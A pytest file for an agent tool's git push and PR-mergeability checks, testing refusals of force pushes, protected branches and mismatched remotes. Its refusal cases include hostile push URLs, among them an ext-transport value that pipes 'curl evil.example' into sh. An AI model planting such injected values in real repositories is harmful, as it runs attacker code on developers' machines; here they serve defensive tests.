"""Pure git_act runner fakes. No Store / Postgres."""

from __future__ import annotations

import json

import pytest

from agent_cli.git_act import GitActError, measure_mergeable, push_branch
from agent_cli.runtime import Completed

pytestmark = pytest.mark.no_pg

CWD = "/tmp/repo"
SHA = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
FORCE_FLAGS = ("--force", "--force-with-lease", "-f")
# Refspec pins expected_sha (not mutable HEAD) — SHA must appear in asserted push argv.
PUSH_ARGV = ["git", "-C", CWD, "push", "--", "origin", f"{SHA}:refs/heads/feat-x"]


def _config(argv: list[str]) -> Completed | None:
    if "config" not in argv or "--get" not in argv:
        return None
    key = argv[-1]
    if key == "branch.feat-x.remote":
        return Completed(0, "origin\n", "")
    if key == "branch.feat-x.merge":
        return Completed(0, "refs/heads/feat-x\n", "")
    return Completed(1, "", "")


def _remote(argv: list[str]) -> Completed | None:
    """Fake `git -C <cwd> remote`: single 'origin' remote, matching _config above."""
    if argv == ["git", "-C", CWD, "remote"]:
        return Completed(0, "origin\n", "")
    return None


def _remote_push_url(argv: list[str], *, url: str) -> Completed | None:
    """Fake `git remote get-url --push <remote>`."""
    if argv[:3] == ["git", "-C", CWD] and argv[3:6] == ["remote", "get-url", "--push"]:
        return Completed(0, url + "\n", "")
    return None


def _assert_git_c(argv: list[str]) -> None:
    assert argv[:3] == ["git", "-C", CWD]
    for flag in FORCE_FLAGS:
        assert flag not in argv


def _expected_repo_refuse_runner(url: str):
    """Shared stub for expected_repo mismatch cases: no fetch/push allowed."""
    calls: list[list[str]] = []

    def runner(argv: list[str]) -> Completed:
        calls.append(list(argv))
        _assert_git_c(argv)
        if "rev-parse" in argv and "--abbrev-ref" in argv and "HEAD" in argv:
            return Completed(0, "feat-x\n", "")
        if "--porcelain" in argv:
            return Completed(0, "", "")
        if "@{upstream}" in argv and "rev-list" not in argv:
            return Completed(0, "origin/feat-x\n", "")
        cfg = _config(argv)
        if cfg is not None:
            return cfg
        rem = _remote(argv)
        if rem is not None:
            return rem
        remote_url = _remote_push_url(argv, url=url)
        if remote_url is not None:
            return remote_url
        if "push" in argv or "fetch" in argv:
            raise AssertionError("must not fetch/push when expected_repo mismatches")
        raise AssertionError(f"unexpected argv: {argv}")

    return calls, runner


def _expected_repo_succeed_runner(url: str):
    """Shared stub for expected_repo match cases: ahead-one fetch/push path."""
    calls: list[list[str]] = []

    def runner(argv: list[str]) -> Completed:
        calls.append(list(argv))
        _assert_git_c(argv)
        if "rev-parse" in argv and "--abbrev-ref" in argv and "HEAD" in argv:
            return Completed(0, "feat-x\n", "")
        if "--porcelain" in argv:
            return Completed(0, "", "")
        if "@{upstream}" in argv and "rev-list" not in argv:
            return Completed(0, "origin/feat-x\n", "")
        cfg = _config(argv)
        if cfg is not None:
            return cfg
        rem = _remote(argv)
        if rem is not None:
            return rem
        remote_url = _remote_push_url(argv, url=url)
        if remote_url is not None:
            return remote_url
        if "fetch" in argv:
            return Completed(0, "", "")
        if "rev-list" in argv:
            return Completed(0, "0\t1\n", "")
        if argv == PUSH_ARGV:
            return Completed(0, "", "")
        if argv == ["git", "-C", CWD, "rev-parse", "HEAD"]:
            return Completed(0, SHA + "\n", "")
        raise AssertionError(f"unexpected argv: {argv}")

    return calls, runner


def test_push_ahead_one_pushes_without_force() -> None:
    calls: list[list[str]] = []

    def runner(argv: list[str]) -> Completed:
        calls.append(list(argv))
        _assert_git_c(argv)
        if "rev-parse" in argv and "--abbrev-ref" in argv and "HEAD" in argv:
            return Completed(0, "feat-x\n", "")
        if "--porcelain" in argv:
            return Completed(0, "", "")
        if "@{upstream}" in argv and "rev-list" not in argv:
            return Completed(0, "origin/feat-x\n", "")
        cfg = _config(argv)
        if cfg is not None:
            return cfg
        rem = _remote(argv)
        if rem is not None:
            return rem
        url = _remote_push_url(argv, url="git@github.com:org/app.git")
        if url is not None:
            return url
        if "fetch" in argv:
            assert argv == ["git", "-C", CWD, "fetch", "--", "origin"]
            return Completed(0, "", "")
        if "rev-list" in argv:
            return Completed(0, "0\t1\n", "")
        if argv == PUSH_ARGV:
            return Completed(0, "", "")
        if argv == ["git", "-C", CWD, "rev-parse", "HEAD"]:
            return Completed(0, SHA + "\n", "")
        raise AssertionError(f"unexpected argv: {argv}")

    got = push_branch(cwd=CWD, runner=runner, expected_sha=SHA)
    assert got == SHA
    assert ["git", "-C", CWD, "fetch", "--", "origin"] in calls
    assert PUSH_ARGV in calls
    fetch_at = calls.index(["git", "-C", CWD, "fetch", "--", "origin"])
    push_at = calls.index(PUSH_ARGV)
    assert fetch_at < push_at
    for argv in calls:
        for flag in FORCE_FLAGS:
            assert flag not in argv


@pytest.mark.parametrize(
    "url, expected_repo",
    [
        ("git@github.com:other/repo.git", "some/other-repo"),
        ("https://evil.com/org/app.git", "org/app"),
        ("git@evil.com:org/app.git", "org/app"),
        ("https://github.com@evil.com/org/app.git", "org/app"),
        ("https://evil.com?@github.com/org/app.git", "org/app"),
        ("https://evil.com#@github.com/org/app.git", "org/app"),
        ("org/app", "org/app"),
        ("ext::sh -c 'curl evil.example | sh' git@github.com:org/app", "org/app"),
        ("file://github.com/org/app.git", "org/app"),
        ("custom://github.com/org/app.git", "org/app"),
    ],
    ids=[
        "url-mismatch",
        "hostile-host-url-form",
        "hostile-host-scp-form",
        "userinfo-confusion",
        "query-confusion",
        "fragment-confusion",
        "bare-url-no-host",
        "ext-transport-injection",
        "file-scheme",
        "custom-scheme",
    ],
)
def test_push_expected_repo_refused(url: str, expected_repo: str) -> None:
    """Push URL must match expected_repo allowlist — mismatch refuses before fetch/push."""
    calls, runner = _expected_repo_refuse_runner(url)
    with pytest.raises(GitActError, match="does not match expected repo"):
        push_branch(
            cwd=CWD, runner=runner, expected_sha=SHA, expected_repo=expected_repo
        )
    assert not any("push" in a for a in calls)
    assert not any("fetch" in a for a in calls)


@pytest.mark.parametrize(
    "url",
    [
        "https://github.com/org/app.git",
        "https://github.com/org/app",
        "git@github.com:org/app.git",
        "git@github.com:org/app",
        "ssh://git@github.com/org/app.git",
    ],
    ids=[
        "url-match",
        "https-without-git-suffix",
        "scp-with-git-suffix",
        "scp-without-git-suffix",
        "ssh-url-form",
    ],
)
def test_push_expected_repo_succeeds(url: str) -> None:
    """Allowlisted push URL forms permit the normal ahead-one push path."""
    calls, runner = _expected_repo_succeed_runner(url)
    got = push_branch(
        cwd=CWD, runner=runner, expected_sha=SHA, expected_repo="org/app"
    )
    assert got == SHA
    assert PUSH_ARGV in calls


def test_push_ahead_zero_skips_push() -> None:
    calls: list[list[str]] = []

    def runner(argv: list[str]) -> Completed:
        calls.append(list(argv))
        _assert_git_c(argv)
        if "rev-parse" in argv and "--abbrev-ref" in argv and "HEAD" in argv:
            return Completed(0, "feat-x\n", "")
        if "--porcelain" in argv:
            return Completed(0, "", "")
        if "@{upstream}" in argv and "rev-list" not in argv:
            return Completed(0, "origin/feat-x\n", "")
        cfg = _config(argv)
        if cfg is not None:
            return cfg
        rem = _remote(argv)
        if rem is not None:
            return rem
        if "fetch" in argv:
            return Completed(0, "", "")
        if "rev-list" in argv:
            return Completed(0, "0 0\n", "")
        if "push" in argv:
            raise AssertionError("must not push when ahead==0")
        if argv == ["git", "-C", CWD, "rev-parse", "HEAD"]:
            return Completed(0, "abc1234\n", "")
        raise AssertionError(f"unexpected argv: {argv}")

    assert push_branch(cwd=CWD, runner=runner, expected_sha=SHA) == "abc1234"
    assert not any("push" in a for a in calls)


def test_push_protected_branch_develop() -> None:
    calls: list[list[str]] = []

    def runner(argv: list[str]) -> Completed:
        calls.append(list(argv))
        if "rev-parse" in argv and "--abbrev-ref" in argv and "HEAD" in argv:
            return Completed(0, "develop\n", "")
        raise AssertionError(f"unexpected argv: {argv}")

    with pytest.raises(GitActError):
        push_branch(cwd=CWD, runner=runner, expected_sha=SHA)
    assert not any("push" in a for a in calls)


def test_push_expected_branch_without_expected_repo_refused() -> None:
    """expected_branch alone must not push — destination check is mandatory."""
    calls: list[list[str]] = []

    def boom(argv: list[str]) -> Completed:
        calls.append(list(argv))
        raise AssertionError(f"runner must not be called: {argv}")

    with pytest.raises(
        GitActError,
        match="expected_branch set without expected_repo",
    ):
        push_branch(
            cwd=CWD, runner=boom, expected_sha=SHA, expected_branch="feat-x"
        )
    assert calls == []


def test_push_expected_branch_mismatch() -> None:
    calls: list[list[str]] = []

    def runner(argv: list[str]) -> Completed:
        calls.append(list(argv))
        if "rev-parse" in argv and "--abbrev-ref" in argv and "HEAD" in argv:
            return Completed(0, "feat-x\n", "")
        raise AssertionError(f"unexpected argv: {argv}")

    with pytest.raises(GitActError, match="expects 'error-fix-aaaaaaaa'"):
        push_branch(
            cwd=CWD,
            runner=runner,
            expected_sha=SHA,
            expected_branch="error-fix-aaaaaaaa",
            expected_repo="org/app",
        )
    assert not any("push" in a for a in calls)


def test_push_dirty_porcelain() -> None:
    def runner(argv: list[str]) -> Completed:
        if "rev-parse" in argv and "--abbrev-ref" in argv and "HEAD" in argv:
            return Completed(0, "feat-x\n", "")
        if "--porcelain" in argv:
            return Completed(0, " M file.py\n", "")
        raise AssertionError(f"unexpected argv: {argv}")

    with pytest.raises(GitActError, match="uncommitted changes"):
        push_branch(cwd=CWD, runner=runner, expected_sha=SHA)


SET_UPSTREAM_PUSH = [
    "git",
    "-C",
    CWD,
    "push",
    "--set-upstream",
    "--",
    "origin",
    f"{SHA}:refs/heads/feat-x",
]


def test_push_no_upstream_sets_upstream_with_origin() -> None:
    """Fresh branch (no @{upstream}): push --set-upstream to the sole origin remote."""
    calls: list[list[str]] = []

    def runner(argv: list[str]) -> Completed:
        calls.append(list(argv))
        _assert_git_c(argv)
        if "rev-parse" in argv and "--abbrev-ref" in argv and "HEAD" in argv:
            return Completed(0, "feat-x\n", "")
        if "--porcelain" in argv:
            return Completed(0, "", "")
        if "@{upstream}" in argv:
            return Completed(1, "", "no upstream configured")
        if argv == ["git", "-C", CWD, "remote"]:
            return Completed(0, "origin\n", "")
        url = _remote_push_url(argv, url="git@github.com:org/app.git")
        if url is not None:
            return url
        if argv == SET_UPSTREAM_PUSH:
            return Completed(0, "", "")
        if argv == ["git", "-C", CWD, "rev-parse", "HEAD"]:
            return Completed(0, SHA + "\n", "")
        raise AssertionError(f"unexpected argv: {argv}")

    got = push_branch(
        cwd=CWD,
        runner=runner,
        expected_sha=SHA,
        expected_branch="feat-x",
        expected_repo="org/app",
    )
    assert got == SHA
    assert SET_UPSTREAM_PUSH in calls
    for argv in calls:
        for flag in FORCE_FLAGS:
            assert flag not in argv


def test_push_no_upstream_ambiguous_remotes_errors() -> None:
    def runner(argv: list[str]) -> Completed:
        if "rev-parse" in argv and "--abbrev-ref" in argv and "HEAD" in argv:
            return Completed(0, "feat-x\n", "")
        if "--porcelain" in argv:
            return Completed(0, "", "")
        if "@{upstream}" in argv:
            return Completed(1, "", "no upstream configured")
        if argv == ["git", "-C", CWD, "remote"]:
            return Completed(0, "upstream\nfork\n", "")
        raise AssertionError(f"unexpected argv: {argv}")

    with pytest.raises(GitActError, match="ambiguous remotes"):
        push_branch(
            cwd=CWD,
            runner=runner,
            expected_sha=SHA,
            expected_branch="feat-x",
            expected_repo="org/app",
        )


def test_push_no_upstream_without_expected_branch_fails_closed() -> None:
    """Ordinary (non-error-fix) tasks keep the original fail-closed behavior:
    no upstream configured means a human must push manually, not a silent
    auto-set-upstream push."""

    def runner(argv: list[str]) -> Completed:
        if "rev-parse" in argv and "--abbrev-ref" in argv and "HEAD" in argv:
            return Completed(0, "feat-x\n", "")
        if "--porcelain" in argv:
            return Completed(0, "", "")
        if "@{upstream}" in argv:
            return Completed(1, "", "no upstream configured")
        raise AssertionError(f"unexpected argv: {argv}")

    with pytest.raises(GitActError, match="no upstream"):
        push_branch(cwd=CWD, runner=runner, expected_sha=SHA)


def test_push_behind_errors_no_push() -> None:
    calls: list[list[str]] = []

    def runner(argv: list[str]) -> Completed:
        calls.append(list(argv))
        if "rev-parse" in argv and "--abbrev-ref" in argv and "HEAD" in argv:
            return Completed(0, "feat-x\n", "")
        if "--porcelain" in argv:
            return Completed(0, "", "")
        if "@{upstream}" in argv and "rev-list" not in argv:
            return Completed(0, "origin/feat-x\n", "")
        cfg = _config(argv)
        if cfg is not None:
            return cfg
        rem = _remote(argv)
        if rem is not None:
            return rem
        if "fetch" in argv:
            return Completed(0, "", "")
        if "rev-list" in argv:
            return Completed(0, "1\t0\n", "")
        if "push" in argv:
            raise AssertionError("must not push when behind")
        raise AssertionError(f"unexpected argv: {argv}")

    with pytest.raises(GitActError, match="branch is behind upstream"):
        push_branch(cwd=CWD, runner=runner, expected_sha=SHA)
    assert not any("push" in a for a in calls)


def test_push_upstream_origin_develop_refused() -> None:
    def runner(argv: list[str]) -> Completed:
        if "rev-parse" in argv and "--abbrev-ref" in argv and "HEAD" in argv:
            return Completed(0, "feat-x\n", "")
        if "--porcelain" in argv:
            return Completed(0, "", "")
        if "@{upstream}" in argv and "rev-list" not in argv:
            return Completed(0, "origin/develop\n", "")
        if "config" in argv and "--get" in argv:
            key = argv[-1]
            if key == "branch.feat-x.remote":
                return Completed(0, "origin\n", "")
            if key == "branch.feat-x.merge":
                return Completed(0, "refs/heads/develop\n", "")
            return Completed(1, "", "")
        raise AssertionError(f"unexpected argv: {argv}")

    with pytest.raises(GitActError, match="protected branch"):
        push_branch(cwd=CWD, runner=runner, expected_sha=SHA)


def test_push_upstream_tracks_wrong_expected_branch_refused() -> None:
    """Local name matches expected_branch, but upstream merge tracks elsewhere."""
    calls: list[list[str]] = []
    branch = "error-fix-aaaaaaaa"

    def runner(argv: list[str]) -> Completed:
        calls.append(list(argv))
        if "rev-parse" in argv and "--abbrev-ref" in argv and "HEAD" in argv:
            return Completed(0, f"{branch}\n", "")
        if "--porcelain" in argv:
            return Completed(0, "", "")
        if "@{upstream}" in argv and "rev-list" not in argv:
            return Completed(0, "origin/some-other-branch\n", "")
        if "config" in argv and "--get" in argv:
            key = argv[-1]
            if key == f"branch.{branch}.remote":
                return Completed(0, "origin\n", "")
            if key == f"branch.{branch}.merge":
                return Completed(0, "refs/heads/some-other-branch\n", "")
            return Completed(1, "", "")
        raise AssertionError(f"unexpected argv: {argv}")

    with pytest.raises(GitActError, match="refusing to push"):
        push_branch(
            cwd=CWD,
            runner=runner,
            expected_sha=SHA,
            expected_branch=branch,
            expected_repo="org/app",
        )
    assert not any("push" in a for a in calls)
    assert not any("fetch" in a for a in calls)


def test_push_upstream_remote_mismatch_refused() -> None:
    """branch.<b>.remote tracks a remote other than the one `git remote`
    resolves to (single-remote-or-origin, same rule the fresh-branch path
    uses) — refuse rather than fetch/push to an unexpected remote."""
    calls: list[list[str]] = []

    def runner(argv: list[str]) -> Completed:
        calls.append(list(argv))
        if "rev-parse" in argv and "--abbrev-ref" in argv and "HEAD" in argv:
            return Completed(0, "feat-x\n", "")
        if "--porcelain" in argv:
            return Completed(0, "", "")
        if "@{upstream}" in argv and "rev-list" not in argv:
            return Completed(0, "fork/feat-x\n", "")
        if "config" in argv and "--get" in argv:
            key = argv[-1]
            if key == "branch.feat-x.remote":
                return Completed(0, "fork\n", "")
            if key == "branch.feat-x.merge":
                return Completed(0, "refs/heads/feat-x\n", "")
            return Completed(1, "", "")
        if argv == ["git", "-C", CWD, "remote"]:
            return Completed(0, "origin\nfork\n", "")
        raise AssertionError(f"unexpected argv: {argv}")

    with pytest.raises(GitActError, match="refusing to push"):
        push_branch(cwd=CWD, runner=runner, expected_sha=SHA)
    assert not any("push" in a for a in calls)
    assert not any("fetch" in a for a in calls)


def test_push_upstream_feat_main_not_protected() -> None:
    calls: list[list[str]] = []

    def runner(argv: list[str]) -> Completed:
        calls.append(list(argv))
        if "rev-parse" in argv and "--abbrev-ref" in argv and "HEAD" in argv:
            return Completed(0, "feat-x\n", "")
        if "--porcelain" in argv:
            return Completed(0, "", "")
        if "@{upstream}" in argv and "rev-list" not in argv:
            return Completed(0, "origin/feat/main\n", "")
        if "config" in argv and "--get" in argv:
            key = argv[-1]
            if key == "branch.feat-x.remote":
                return Completed(0, "origin\n", "")
            if key == "branch.feat-x.merge":
                return Completed(0, "refs/heads/feat/main\n", "")
            return Completed(1, "", "")
        rem = _remote(argv)
        if rem is not None:
            return rem
        if "fetch" in argv:
            return Completed(0, "", "")
        if "rev-list" in argv:
            return Completed(0, "0 0\n", "")
        if argv[-1] == "HEAD":
            return Completed(0, SHA + "\n", "")
        raise AssertionError(f"unexpected argv: {argv}")

    assert push_branch(cwd=CWD, runner=runner, expected_sha=SHA) == SHA
    assert not any(len(a) > 3 and a[3] == "push" for a in calls)


def test_push_refuses_when_head_moved_before_push() -> None:
    """Pre-push rev-parse must match expected_sha; otherwise refuse without pushing."""
    moved = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
    calls: list[list[str]] = []

    def runner(argv: list[str]) -> Completed:
        calls.append(list(argv))
        _assert_git_c(argv)
        if "rev-parse" in argv and "--abbrev-ref" in argv and "HEAD" in argv:
            return Completed(0, "feat-x\n", "")
        if "--porcelain" in argv:
            return Completed(0, "", "")
        if "@{upstream}" in argv and "rev-list" not in argv:
            return Completed(0, "origin/feat-x\n", "")
        cfg = _config(argv)
        if cfg is not None:
            return cfg
        rem = _remote(argv)
        if rem is not None:
            return rem
        url = _remote_push_url(argv, url="git@github.com:org/app.git")
        if url is not None:
            return url
        if "fetch" in argv:
            return Completed(0, "", "")
        if "rev-list" in argv:
            return Completed(0, "0\t1\n", "")
        if argv == ["git", "-C", CWD, "rev-parse", "HEAD"]:
            return Completed(0, moved + "\n", "")
        raise AssertionError(f"unexpected argv: {argv}")

    with pytest.raises(GitActError, match="HEAD moved"):
        push_branch(cwd=CWD, runner=runner, expected_sha=SHA)
    assert not any("push" in a for a in calls)


def test_mergeable_open_empty_checks() -> None:
    def runner(argv: list[str]) -> Completed:
        if "pr" in argv and "view" in argv:
            return Completed(
                0,
                json.dumps(
                    {
                        "mergeable": "MERGEABLE",
                        "state": "OPEN",
                        "url": "https://example.invalid/p/1",
                        "number": 1,
                        "headRefOid": SHA,
                    }
                ),
                "",
            )
        if "checks" in argv:
            return Completed(0, "[]", "")
        raise AssertionError(f"unexpected argv: {argv}")

    evidence = measure_mergeable(cwd=CWD, runner=runner)
    assert "mergeable" in evidence
    assert "checks=ok" in evidence
    assert "number=1" in evidence


def test_mergeable_all_success() -> None:
    def runner(argv: list[str]) -> Completed:
        if "pr" in argv and "view" in argv:
            return Completed(
                0,
                json.dumps(
                    {
                        "mergeable": "MERGEABLE",
                        "state": "open",
                        "url": "https://example.invalid/p/2",
                        "number": 2,
                        "headRefOid": SHA,
                    }
                ),
                "",
            )
        if "checks" in argv:
            return Completed(
                0,
                json.dumps(
                    [
                        {"name": "ci", "state": "SUCCESS"},
                        {"name": "lint", "state": "SUCCESS"},
                    ]
                ),
                "",
            )
        raise AssertionError(f"unexpected argv: {argv}")

    evidence = measure_mergeable(cwd=CWD, runner=runner)
    assert "checks=ok" in evidence


def test_mergeable_conflicting() -> None:
    def runner(argv: list[str]) -> Completed:
        if "pr" in argv and "view" in argv:
            return Completed(
                0,
                json.dumps(
                    {
                        "mergeable": "CONFLICTING",
                        "state": "OPEN",
                        "url": "https://example.invalid/p/3",
                        "number": 3,
                        "headRefOid": SHA,
                    }
                ),
                "",
            )
        raise AssertionError(f"unexpected argv: {argv}")

    with pytest.raises(GitActError, match="CONFLICTING"):
        measure_mergeable(cwd=CWD, runner=runner)


def test_mergeable_check_failure() -> None:
    def runner(argv: list[str]) -> Completed:
        if "pr" in argv and "view" in argv:
            return Completed(
                0,
                json.dumps(
                    {
                        "mergeable": "MERGEABLE",
                        "state": "OPEN",
                        "url": "https://example.invalid/p/4",
                        "number": 4,
                        "headRefOid": SHA,
                    }
                ),
                "",
            )
        if "checks" in argv:
            return Completed(
                0,
                json.dumps([{"name": "ci", "state": "FAILURE"}]),
                "",
            )
        raise AssertionError(f"unexpected argv: {argv}")

    with pytest.raises(GitActError, match="check ci is FAILURE"):
        measure_mergeable(cwd=CWD, runner=runner)


def test_mergeable_check_pending() -> None:
    def runner(argv: list[str]) -> Completed:
        if "pr" in argv and "view" in argv:
            return Completed(
                0,
                json.dumps(
                    {
                        "mergeable": "MERGEABLE",
                        "state": "OPEN",
                        "url": "https://example.invalid/p/5",
                        "number": 5,
                        "headRefOid": SHA,
                    }
                ),
                "",
            )
        if "checks" in argv:
            return Completed(
                0,
                json.dumps([{"name": "ci", "state": "PENDING"}]),
                "",
            )
        raise AssertionError(f"unexpected argv: {argv}")

    with pytest.raises(GitActError, match="check ci is PENDING"):
        measure_mergeable(cwd=CWD, runner=runner)


def test_mergeable_check_skipped() -> None:
    def runner(argv: list[str]) -> Completed:
        if "pr" in argv and "view" in argv:
            return Completed(
                0,
                json.dumps(
                    {
                        "mergeable": "MERGEABLE",
                        "state": "OPEN",
                        "url": "https://example.invalid/p/6",
                        "number": 6,
                        "headRefOid": SHA,
                    }
                ),
                "",
            )
        if "checks" in argv:
            return Completed(
                0,
                json.dumps([{"name": "ci", "state": "SKIPPED"}]),
                "",
            )
        raise AssertionError(f"unexpected argv: {argv}")

    with pytest.raises(GitActError, match="check ci is SKIPPED"):
        measure_mergeable(cwd=CWD, runner=runner)


def test_mergeable_head_mismatch() -> None:
    def runner(argv: list[str]) -> Completed:
        if "pr" in argv and "view" in argv:
            return Completed(
                0,
                json.dumps(
                    {
                        "mergeable": "MERGEABLE",
                        "state": "OPEN",
                        "url": "https://example.invalid/p/8",
                        "number": 8,
                        "headRefOid": SHA,
                    }
                ),
                "",
            )
        raise AssertionError(f"unexpected argv: {argv}")

    with pytest.raises(GitActError, match="does not match"):
        measure_mergeable(cwd=CWD, runner=runner, expected_head="bbbbbbb")


def test_mergeable_missing_number() -> None:
    def runner(argv: list[str]) -> Completed:
        if "pr" in argv and "view" in argv:
            return Completed(
                0,
                json.dumps(
                    {
                        "mergeable": "MERGEABLE",
                        "state": "OPEN",
                        "url": "https://example.invalid/p/7",
                    }
                ),
                "",
            )
        raise AssertionError(f"unexpected argv: {argv}")

    with pytest.raises(GitActError, match="missing number"):
        measure_mergeable(cwd=CWD, runner=runner)
